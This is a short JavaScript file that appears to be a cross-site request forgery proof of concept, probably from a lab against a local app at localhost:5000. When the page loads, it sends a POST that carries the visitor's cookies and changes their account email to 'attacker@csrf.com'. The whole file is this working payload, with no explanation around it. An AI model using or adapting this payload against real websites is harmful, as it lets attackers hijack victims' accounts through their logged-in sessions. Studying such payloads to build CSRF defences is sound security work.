window.addEventListener('load', () => {
    // document.form.submit()

    fetch('http://localhost:5000/edit', {
        method: 'POST',
        credentials: 'include',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'email=attacker@csrf.com'
    })
})
